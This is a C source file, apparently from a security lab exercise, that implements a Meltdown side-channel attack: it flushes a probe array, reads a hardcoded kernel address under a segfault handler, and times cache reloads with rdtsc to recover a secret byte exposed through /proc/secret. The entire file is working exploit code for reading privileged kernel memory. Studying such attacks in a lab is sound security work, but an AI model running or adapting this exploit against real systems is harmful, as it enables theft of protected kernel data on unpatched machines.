#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <emmintrin.h>

#define CACHE_HIT_THRESHOLD 130
#define MARGIN 1024

int array[256*4096];
jmp_buf restore_point;
static int scores[256];			// Remove later

void handle_segfault(int sig)
{

  printf("Caught signal %d\n", sig);
  signal(SIGSEGV, &handle_segfault);
  longjmp(restore_point, SIGSEGV);

}
void handle_segint(int sig)
{
  printf("Caught interrupt signal %d\n", sig);
  exit(1);
}

void flush()
{
  int i;

  // FLush the array elements that could be cached
  for (i=0; i<256; i++)
  _mm_clflush(&array[i*4096 + MARGIN]);
}

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

void reload()
{
  int i;
  uint64_t start, end;
  // Reload the array and check hits
  for (i=0; i<256; i++)
  {
    start = rdtsc();
    array[i*4096 + MARGIN] = 1;
    end = rdtsc();
    if ((end - start) <= CACHE_HIT_THRESHOLD)
      {
        scores[i]++;
         // printf ("Hit on element array[%d * 4096 ] \n", i);
      }
  }
}

void meltdown(unsigned long kernel_addr)
{
  char data = 0;
  int i, a=0;

  for (i=0; i<800; i++)
    a += 1;
  
  data = *(char*)kernel_addr;  
  array[data * 4096 + MARGIN] += 1; 
}

int main()
{
  int i, j, ret=0;      // change ret var name later

  // Registering Signal handler for SIGSEGV
  signal(SIGSEGV, handle_segfault);
  int fd = open("/proc/secret", O_RDONLY);

  if (fd < 0) {
    perror("open");
    return -1;
  }
  memset(scores, 0, sizeof(scores));
  flush();
  // Retry 1000 times on the same address.

  for (i = 0; i < 1000; i++) {
    ret = pread(fd, NULL, 0, 0); 
    if (ret < 0) {
      perror("pread");
      break;
    }
  
  int fault_code = setjmp(restore_point);
  // Flush the probing array
  for (j = 0; j < 256; j++) 
    _mm_clflush(&array[j * 4096 + MARGIN]);
  if (fault_code == 0) 
  {
    meltdown(0x0000000002487645); 
  }
  else{
    reload();
  }
 // reload();
  }

  int max = 0;
  for (i = 0; i < 256; i++) {
    if (scores[max] < scores[i]) max = i;
  }
  printf("The secret value is %d %c\n", max, max);
  printf("The number of hits is %d\n", scores[max]);
return 0;
}

